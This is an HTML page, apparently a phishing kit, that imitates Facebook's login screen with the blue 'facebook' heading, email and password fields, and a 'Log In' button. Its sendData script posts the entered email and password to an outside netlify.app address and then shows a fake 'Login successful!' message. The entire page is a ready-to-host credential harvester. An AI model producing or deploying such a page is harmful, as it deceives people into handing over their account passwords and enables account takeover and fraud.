<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Clone</title>
    <style>
        .container {
            display: flex;
            flex-direction: column;
            gap: 10px;
            max-width: 300px;
            margin: 50px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        h1 {
            color: #1877f2;
            text-align: center;
        }

        input, button {
            width: 100%;
            padding: 10px;
            margin-top: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }

        .login-btn {
            background-color: #1877f2;
            color: white;
            cursor: pointer;
            border: none;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background-color: #166fe5;
        }

        .forgot-link {
            text-align: center;
            margin-top: 10px;
            color: #1877f2;
            text-decoration: none;
            display: block;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>facebook</h1>
        <input type="text" id="email" placeholder="Email or phone number" />
        <input type="password" id="password" placeholder="Password" />
        <button class="login-btn" onclick="sendData()">Log In</button>
        <a href="#" class="forgot-link">Forgotten password?</a>
    </div>

    <script>
        function sendData() {
            let email = document.getElementById('email').value;
            let password = document.getElementById('password').value;

            if (email && password) {
                fetch('https://67d07a19b60475ac739e1fe8--beamish-brioche-57b0c8.netlify.app/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email: email, password: password })
                })
                .then(response => {
                    if (response.ok) {
                        return response.json();
                    } else {
                        throw new Error('Failed to send data');
                    }
                })
                .then(data => {
                    console.log('Data sent successfully:', data);
                    alert('Login successful!');
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Failed to log in. Try again.');
                });
            } else {
                alert('Please enter email and password!');
            }
        }
    </script>
</body>
</html>
